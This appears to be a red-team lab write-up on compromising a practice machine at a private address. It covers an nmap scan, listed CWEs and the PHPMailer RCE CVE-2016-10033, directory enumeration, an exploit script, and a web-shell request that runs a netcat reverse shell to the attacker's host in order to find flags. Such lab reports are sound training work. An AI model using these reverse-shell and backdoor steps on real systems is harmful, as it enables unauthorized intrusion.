# **Red Team: Summary of Operations**

## TARGET 2

### Table of Contents

- Exposed Services
- Critical Vulnerabilities
- Exploitation

---

## Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

nmap -sV 192.168.1.115

![1](/Images/4/1.PNG)

---

## Critical Vulnerabilities

The CVE and CWE databases give us information of vulnerabilities found in the previous step. These vulnerabilities are potential points of entry:

Vulnerability | Description | Impact
---|---|---
**CWE-200** Exposure of sensitive Information to an unauthorized actor | The product exposes sensitive Information to an actor that is not explicitly authorized to have access | Allowing sensitive information to be compromised so easily can result in a breach that can have significant effects on your business
**CWE-548** Exposure of information through directory browsing | A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers | Allowing an bad actor to obtain more information about your server could allow them to further their attack
**CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer | HPMailer allows extra parameters in the mail command and consequently executes arbitrary code | An attacker can execute commands on the web server remotely  allowing them to further compromise the target.

---

# Exploitation

The Red Team was able to penetrate Target 2 and retrieve the following confidential data:

**flag1:**  `flag1{a2c1f66d28051bd3a5874b5b6r43e21}`

- **CWE-200** Exposure of sensitive Information to an unauthorized actor
    
    1. `nikto -C all -h 192.168.1.115`

        ![2](/Images/4/2.PNG)

    2. `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.115`
    
        ![3](/Images/4/3.PNG)
    
    3. Important Files Discovered
     
        ![4](/Images/4/4.PNG)     
          
     **Flag1**

    ![5](/Images/4/5.png)

    **List of vulnerabilities**

    ![6](/Images/4/6.png)    

    **phpmailer version**

    ![7](/Images/4/7.png)  

    4. `searchsploit phpmailer`

     ![8](/Images/4/8.png)  

    4. `sudo chmod 777 exploit.sh`

    5. `./exploit.sh`

    6. In kali: `nc -lnvp 4444`

    7. `192.168.1.115/backdoor.php?cmd=nc 192.168.1.90 4444 -e /bin/bash`

    ![14](/Images/1/14.png)

    8. `Find /var/www -type f -name .flag*’`

    9. Go to browser and put `http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`

    ![15](/Images/1/15.png)